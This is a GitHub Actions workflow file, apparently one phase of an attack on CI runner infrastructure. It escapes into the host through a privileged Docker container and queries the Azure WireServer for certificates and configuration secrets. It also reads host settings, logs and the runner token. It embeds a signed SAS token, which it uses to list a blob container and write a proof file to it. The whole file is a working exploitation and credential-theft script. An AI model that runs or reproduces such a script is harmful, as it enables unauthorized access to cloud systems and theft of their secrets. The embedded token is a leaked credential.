name: Phase4 - Wire Server Certs + SAS Exploitation
on: workflow_dispatch
jobs:
  secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Extract Wire Server Secrets (BusyBox-compatible)
        run: |
          docker run --rm --privileged --pid=host --net=host -v /:/host alpine:latest sh -c '
          apk add --no-cache curl jq wget 2>/dev/null | tail -1

          echo "=== GOALSTATE (fresh fetch) ==="
          GOALSTATE=$(wget -qO- --timeout=10 --header="x-ms-version:2012-11-30" "http://168.63.129.16/machine/?comp=goalstate" 2>&1)
          echo "$GOALSTATE"

          # BusyBox-compatible extraction using sed
          CONTAINER_ID=$(echo "$GOALSTATE" | sed -n "s/.*<ContainerId>\([^<]*\)<\/ContainerId>.*/\1/p")
          INSTANCE_ID=$(echo "$GOALSTATE" | sed -n "s/.*<InstanceId>\([^<]*\)<\/InstanceId>.*/\1/p")
          echo ""
          echo "ContainerID: $CONTAINER_ID"
          echo "InstanceID: $INSTANCE_ID"

          # URL-encode the instance ID (replace special chars)
          ENCODED_INSTANCE=$(echo "$INSTANCE_ID" | sed "s/-/%2D/g" | sed "s/\./%2E/g" | sed "s/_/%5F/g")
          echo "Encoded Instance: $ENCODED_INSTANCE"

          BASE="http://168.63.129.16:80/machine/${CONTAINER_ID}/${ENCODED_INSTANCE}"
          echo "Base URL: $BASE"
          echo ""

          echo "=== CERTIFICATES ==="
          wget -qO- --timeout=10 --header="x-ms-version:2012-11-30" \
            "${BASE}?comp=certificates&incarnation=1" 2>&1 || echo "[CERT FETCH FAILED]"
          echo ""

          echo "=== EXTENSIONS CONFIG ==="
          wget -qO- --timeout=10 --header="x-ms-version:2012-11-30" \
            "${BASE}?comp=config&type=extensionsConfig&incarnation=1" 2>&1 || echo "[EXT CONFIG FAILED]"
          echo ""

          echo "=== FULL CONFIG ==="
          wget -qO- --timeout=10 --header="x-ms-version:2012-11-30" \
            "${BASE}?comp=config&type=fullConfig&incarnation=1" 2>&1 || echo "[FULL CONFIG FAILED]"
          echo ""

          echo "=== SHARED CONFIG ==="
          wget -qO- --timeout=10 --header="x-ms-version:2012-11-30" \
            "${BASE}?comp=config&type=sharedConfig&incarnation=1" 2>&1 || echo "[SHARED CONFIG FAILED]"
          echo ""

          echo "=== HCA SETTINGS FILE ==="
          cat /host/opt/hca/.settings 2>/dev/null
          echo ""

          echo "=== HCA LOGS ==="
          ls -la /host/opt/hca/logs/ 2>/dev/null
          head -100 /host/opt/hca/logs/*.log 2>/dev/null
          echo ""

          echo "=== TEST SAS TOKEN (LIST BLOBS) ==="
          SAS_URI="https://hcrpprodiad02diag.blob.core.windows.net/77d5f311-3e7c-4880-afb0-e3d57b840131?se=2026-06-01T15%3A22%3A01Z&sig=DLykUYdqujKjpfY8L7yXnvbx3nh7kO1uRclGIRTaGG4%3D&ske=2026-06-01T21%3A22%3A01Z&skoid=6af0db8e-c864-4b6a-a9fe-e44dd0941d9e&sks=b&skt=2026-05-31T15%3A22%3A01Z&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skv=2026-04-06&sp=acw&spr=https&sr=c&st=2026-05-31T15%3A22%3A01Z&sv=2026-04-06"
          # Try listing (may not have list permission but lets see)
          wget -qO- --timeout=10 "${SAS_URI}&restype=container&comp=list" 2>&1 | head -50
          echo ""

          echo "=== WRITE TEST TO BLOB ==="
          # Try writing a test blob to confirm write access
          wget -qO- --timeout=10 --method=PUT \
            --header="x-ms-blob-type: BlockBlob" \
            --header="Content-Type: text/plain" \
            --body-data="escape_test_$(date +%s)" \
            "${SAS_URI%\?*}/escape_proof.txt?${SAS_URI#*\?}" 2>&1
          echo ""
          echo "Write test status: $?"

          echo "=== ACTIONS RUNNER TOKEN (from env) ==="
          cat /host/home/runner/work/_temp/.runner_token 2>/dev/null || echo "no .runner_token"
          find /host/home/runner/work/_temp/ -name "*.txt" -o -name "*.json" -o -name "*.sh" 2>/dev/null | head -20
          echo ""

          echo "=== PHASE 4 COMPLETE ==="
          '
